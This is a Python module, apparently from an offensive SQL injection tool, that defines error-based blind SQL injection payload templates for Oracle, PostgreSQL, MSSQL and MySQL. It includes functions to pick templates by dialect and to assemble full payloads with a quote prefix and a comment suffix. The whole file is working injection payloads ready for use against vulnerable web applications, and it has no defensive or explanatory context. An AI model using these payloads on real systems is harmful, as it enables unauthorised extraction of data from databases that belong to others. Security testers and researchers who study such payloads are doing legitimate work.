"""Error-based blind SQL injection channel.

Payload shape:
    prefix = "'"
    body   = "||(SELECT CASE WHEN (cond) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||"
    suffix = "'--"
"""

TEMPLATES = [
    ("oracle_dual_tochar", "oracle",
     "||(SELECT CASE WHEN ({c}) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||"),

    ("oracle_dual_cast", "oracle",
     "||(SELECT CASE WHEN ({c}) THEN CAST(1/0 AS NUMBER) ELSE NULL END FROM dual)||"),

    ("pg_cast_1div0", "postgres",
     "||(SELECT CASE WHEN ({c}) THEN CAST(1/0 AS int) ELSE 1 END)||"),

    ("mssql_if_1div0", "mssql",
     "; IF ({c}) SELECT 1/0--"),

    ("mysql_1div0_sub", "mysql",
     " AND (SELECT 1 FROM (SELECT 1) x WHERE ({c}) AND 1/0)--"),
]


def templates_for(dialect: str) -> list[tuple[str, str]]:
    d = dialect.lower()
    return [(n, t) for (n, dd, t) in TEMPLATES if dd == d]


def build_payload(template: str, condition: str,
                  prefix: str = "", suffix: str = "") -> str:
    body = template.format(c=condition)
    return f"{prefix}{body}{suffix}"


def all_error_dialects() -> list[str]:
    return sorted({d for (_, d, _) in TEMPLATES})
